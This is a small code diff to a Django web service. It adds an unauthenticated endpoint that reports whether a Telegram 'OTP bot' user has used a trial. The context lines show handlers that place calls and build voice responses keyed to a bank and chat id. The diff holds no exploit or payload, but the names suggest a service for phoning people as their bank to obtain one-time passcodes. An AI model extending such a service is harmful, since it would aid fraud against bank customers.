@@ -430,6 +430,17 @@ class CallTrial(APIView):
 
         return Response({'message': 'Call placed'}, status=200)
 
+class SecurityCheck(APIView):
+    permission_classes = [AllowAny]
+
+    def get(self, request):
+        chat_id = request.GET.get('chat_id')
+        otp_bot = Telegram_Otp_bot.objects.get(chat_id=chat_id)
+        if otp_bot.trial_used:
+            return Response({'message': 'Security check enabled'}, status=400)
+        else:
+            return Response({'message': 'Security check not enabled'}, status=200)
+
 @csrf_exempt
 def voice(request,bank,chat_id):
     resp = VoiceResponse()
